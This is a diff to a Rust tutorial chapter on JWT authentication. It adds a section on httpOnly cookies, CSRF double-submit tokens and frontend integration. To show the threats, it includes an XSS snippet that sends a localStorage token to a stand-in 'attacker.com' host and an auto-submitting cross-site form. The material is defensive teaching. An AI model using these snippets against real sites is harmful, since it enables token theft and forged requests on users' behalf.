@@ -13,6 +13,9 @@ This chapter explores JWT (JSON Web Token) authentication using RS256 asymmetric
 - Integration with JWKS for key rotation
 - Detailed error handling for token validation
 - Middleware-based authentication for MCP requests
+- Cookie-based authentication with httpOnly cookies (XSS protection)
+- CSRF protection using double-submit cookie pattern
+- Security layering for web applications vs API clients
 
 ## JWT structure and claims
 
@@ -948,6 +951,297 @@ pub fn generate_client_credentials_token(
 
 **Design decision**: Client credentials tokens use `sub: format!("client:{client_id}")` to distinguish them from user tokens. The prefix allows middleware to apply different authorization rules.
 
+## web application security: cookies and csrf
+
+For web applications (browser-based clients), Pierre implements secure cookie-based authentication with CSRF protection to prevent XSS and CSRF attacks.
+
+### the xss problem with localStorage
+
+Storing JWT tokens in localStorage creates XSS vulnerability:
+
+```typescript
+// ❌ VULNERABLE: localStorage accessible to JavaScript
+localStorage.setItem('auth_token', jwt);
+
+// Attacker can inject script:
+<script>
+  fetch('https://attacker.com/steal', {
+    body: localStorage.getItem('auth_token')
+  });
+</script>
+```
+
+**Problem**: Any JavaScript code (including malicious scripts from XSS) can read localStorage. If an attacker injects JavaScript (via XSS vulnerability), they can steal the authentication token.
+
+### httpOnly cookies solution
+
+httpOnly cookies are inaccessible to JavaScript:
+
+```rust
+/// Set secure authentication cookie with httpOnly flag
+pub fn set_auth_cookie(headers: &mut HeaderMap, token: &str, max_age_secs: i64) {
+    let cookie = format!(
+        "auth_token={}; HttpOnly; Secure; SameSite=Strict; Max-Age={}; Path=/",
+        token, max_age_secs
+    );
+    headers.insert(
+        header::SET_COOKIE,
+        HeaderValue::from_str(&cookie).unwrap(),
+    );
+}
+```
+
+**Source**: src/security/cookies.rs:15-25
+
+Cookie security flags:
+- **HttpOnly=true**: Browser prevents JavaScript access (XSS protection)
+- **Secure=true**: Cookie only sent over HTTPS (prevents sniffing)
+- **SameSite=Strict**: Cookie not sent on cross-origin requests (CSRF mitigation)
+- **Max-Age=86400**: Cookie expires after 24 hours (matches JWT expiry)
+
+### csrf protection with double-submit cookies
+
+httpOnly cookies solve XSS but create CSRF vulnerability. An attacker's site can trigger authenticated requests because browsers automatically include cookies:
+
+```html
+<!-- Attacker's site: attacker.com -->
+<form action="https://pierre.example.com/api/something" method="POST">
+  <input type="hidden" name="data" value="malicious">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+**Problem**: Browser automatically includes auth_token cookie with cross-origin request.
+
+**Solution**: CSRF tokens using double-submit cookie pattern.
+
+#### csrf token manager
+
+**Source**: src/security/csrf.rs:18-58
+```rust
+/// CSRF token manager with user-scoped validation
+pub struct CsrfTokenManager {
+    /// Map of CSRF tokens to (user_id, expiry)
+    tokens: Arc<RwLock<HashMap<String, (Uuid, DateTime<Utc>)>>>,
+}
+
+impl CsrfTokenManager {
+    /// Generate cryptographically secure CSRF token
+    pub async fn generate_token(&self, user_id: Uuid) -> AppResult<String> {
+        // 256-bit (32 byte) random token
+        let mut token_bytes = [0u8; 32];
+        rand::thread_rng().fill_bytes(&mut token_bytes);
+        let token = hex::encode(token_bytes);
+
+        // Store token with 30-minute expiration
+        let expiry = Utc::now() + Duration::minutes(30);
+        let mut tokens = self.tokens.write().await;
+        tokens.insert(token.clone(), (user_id, expiry));
+
+        Ok(token)
+    }
+
+    /// Validate CSRF token for specific user
+    pub async fn validate_token(&self, token: &str, user_id: Uuid) -> AppResult<()> {
+        let tokens = self.tokens.read().await;
+
+        let (stored_user_id, expiry) = tokens
+            .get(token)
+            .ok_or_else(|| AppError::unauthorized("Invalid CSRF token"))?;
+
+        // Check token belongs to this user
+        if *stored_user_id != user_id {
+            return Err(AppError::unauthorized("CSRF token user mismatch"));
+        }
+
+        // Check token not expired
+        if *expiry < Utc::now() {
+            return Err(AppError::unauthorized("CSRF token expired"));
+        }
+
+        Ok(())
+    }
+}
+```
+
+**Key design decisions**:
+1. **User-scoped tokens**: Token validation requires matching user_id from JWT. Attacker cannot use victim's CSRF token even if stolen.
+2. **Cryptographic randomness**: 256-bit tokens (32 bytes) provide sufficient entropy to prevent brute force.
+3. **Short expiration**: 30-minute lifetime limits exposure window. JWT tokens last 24 hours, CSRF tokens expire much sooner.
+4. **In-memory storage**: HashMap provides fast lookups. For distributed systems, use Redis instead.
+
+#### csrf middleware validation
+
+**Source**: src/middleware/csrf.rs:45-91
+```rust
+impl CsrfMiddleware {
+    /// Validate CSRF token for state-changing operations
+    pub async fn validate_csrf(
+        &self,
+        headers: &HeaderMap,
+        method: &Method,
+        user_id: Uuid,
+    ) -> AppResult<()> {
+        // Skip CSRF validation for safe methods
+        if !Self::requires_csrf_validation(method) {
+            return Ok(());
+        }
+
+        // Extract CSRF token from X-CSRF-Token header
+        let csrf_token = headers
+            .get("X-CSRF-Token")
+            .and_then(|v| v.to_str().ok())
+            .ok_or_else(|| AppError::unauthorized("Missing CSRF token"))?;
+
+        // Validate token belongs to this user
+        self.manager.validate_token(csrf_token, user_id).await
+    }
+
+    /// Check if HTTP method requires CSRF validation
+    pub fn requires_csrf_validation(method: &Method) -> bool {
+        matches!(
+            method,
+            &Method::POST | &Method::PUT | &Method::DELETE | &Method::PATCH
+        )
+    }
+}
+```
+
+**Rust idiom**: `matches!` macro provides pattern matching for HTTP methods without verbose `==` comparisons.
+
+#### authentication flow with cookies and csrf
+
+**login handler** (`POST /api/auth/login`):
+
+**Source**: src/routes/auth.rs:1044-1088
+```rust
+pub async fn handle_login(
+    State(resources): State<Arc<ServerResources>>,
+    Json(request): Json<LoginRequest>,
+) -> Result<Response, AppError> {
+    // 1. Authenticate user (verify password)
+    let user = resources.database.get_user_by_email(&request.email).await?;
+    verify_password(&request.password, &user.password_hash)?;
+
+    // 2. Generate JWT token
+    let jwt_token = resources
+        .auth_manager
+        .generate_token_rs256(&resources.jwks_manager, &user.id, &user.email, providers)
+        .context("Failed to generate JWT token")?;
+
+    // 3. Generate CSRF token
+    let csrf_token = resources.csrf_manager.generate_token(user.id).await?;
+
+    // 4. Set secure cookies
+    let mut headers = HeaderMap::new();
+    set_auth_cookie(&mut headers, &jwt_token, 86400); // 24 hours
+    set_csrf_cookie(&mut headers, &csrf_token, 1800); // 30 minutes
+
+    // 5. Return JSON response with CSRF token
+    let response = LoginResponse {
+        jwt_token: Some(jwt_token), // backward compatibility
+        csrf_token,
+        user: UserInfo { id: user.id, email: user.email },
+        expires_at: Utc::now() + Duration::hours(24),
+    };
+
+    Ok((StatusCode::OK, headers, Json(response)).into_response())
+}
+```
+
+**Flow breakdown**:
+1. **Authenticate user**: Verify email/password using Argon2 or bcrypt
+2. **Generate JWT**: Create RS256-signed token with 24-hour expiry
+3. **Generate CSRF token**: Create 256-bit random token with 30-minute expiry
+4. **Set cookies**: Both auth_token (httpOnly) and csrf_token (readable) cookies
+5. **Return CSRF in JSON**: Frontend needs CSRF token to include in X-CSRF-Token header
+
+**authenticated request validation**:
+
+```rust
+async fn protected_handler(
+    State(resources): State<Arc<ServerResources>>,
+    headers: HeaderMap,
+) -> Result<Response, AppError> {
+    // 1. Extract JWT from auth_token cookie
+    let auth_result = resources
+        .auth_middleware
+        .authenticate_request_with_headers(&headers)
+        .await?;
+
+    // 2. Validate CSRF token for POST/PUT/DELETE/PATCH
+    resources
+        .csrf_middleware
+        .validate_csrf(&headers, &Method::POST, auth_result.user_id)
+        .await?;
+
+    // 3. Process authenticated request
+    // ...
+}
+```
+
+**Source**: src/middleware/auth.rs:318-356
+
+Middleware tries multiple authentication methods:
+1. **Cookie-based**: Extract JWT from `auth_token` cookie (preferred for web apps)
+2. **Bearer token**: Extract from `Authorization: Bearer <token>` header (API clients)
+3. **API key**: Extract from `X-API-Key` header (service-to-service)
+
+### frontend integration example
+
+**axios configuration**:
+```typescript
+// Enable automatic cookie handling
+axios.defaults.withCredentials = true;
+
+// Request interceptor: add CSRF token to state-changing requests
+axios.interceptors.request.use((config) => {
+  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(config.method?.toUpperCase() || '')) {
+    const csrfToken = getCsrfToken();
+    if (csrfToken && config.headers) {
+      config.headers['X-CSRF-Token'] = csrfToken;
+    }
+  }
+  return config;
+});
+```
+
+**login flow**:
+```typescript
+async function login(email: string, password: string) {
+  const response = await axios.post('/api/auth/login', { email, password });
+
+  // Store CSRF token in memory (cookies set automatically by browser)
+  setCsrfToken(response.data.csrf_token);
+
+  // Store user info in localStorage (not sensitive)
+  localStorage.setItem('user', JSON.stringify(response.data.user));
+
+  return response.data;
+}
+```
+
+**Why this works**:
+- Browser automatically sends `auth_token` and `csrf_token` cookies with every request
+- Frontend explicitly includes `X-CSRF-Token` header for state-changing requests
+- Attacker's site cannot read CSRF token (cross-origin restriction)
+- Attacker cannot forge valid CSRF token (cryptographic randomness)
+
+### security model summary
+
+| **Attack Type** | **Protection Mechanism** |
+|----------------|--------------------------|
+| XSS token theft | httpOnly cookies (JavaScript cannot read auth_token) |
+| CSRF | double-submit cookie pattern (X-CSRF-Token header required) |
+| Session fixation | Secure flag (cookies only sent over HTTPS) |
+| Cross-site access | SameSite=Strict (cookies not sent on cross-origin requests) |
+| Token injection | User-scoped CSRF validation (token tied to user_id in JWT) |
+| Replay attacks | CSRF token expiration (30-minute lifetime) |
+
+**Design tradeoff**: CSRF tokens expire after 30 minutes, requiring periodic refresh. This trades convenience for security - shorter CSRF lifetime limits exposure window.
+
+**Rust idiom**: Cookie and CSRF managers use `Arc<RwLock<HashMap>>` for concurrent access. `RwLock` allows multiple readers or single writer, optimizing for read-heavy token validation workload.
+
 ## key takeaways
 
 1. **RS256 asymmetric signing**: Uses RSA key pairs from JWKS (Chapter 5) for secure token signing. Clients verify with public keys, server signs with private key.
@@ -969,6 +1263,12 @@ pub fn generate_client_credentials_token(
 9. **Structured logging**: `#[tracing::instrument]` provides observability without exposing sensitive token data in logs.
 
 10. **OAuth integration**: Platform generates standard OAuth 2.0 access tokens and client credentials tokens for third-party integrations.
+
+11. **Cookie-based authentication**: httpOnly cookies prevent XSS token theft, Secure and SameSite flags provide additional protection layers.
+
+12. **CSRF protection**: Double-submit cookie pattern with user-scoped validation prevents cross-site request forgery attacks on web applications.
+
+13. **Security layering**: Multiple authentication methods (cookies, Bearer tokens, API keys) coexist with middleware fallback for different client types.
 
 ---
 
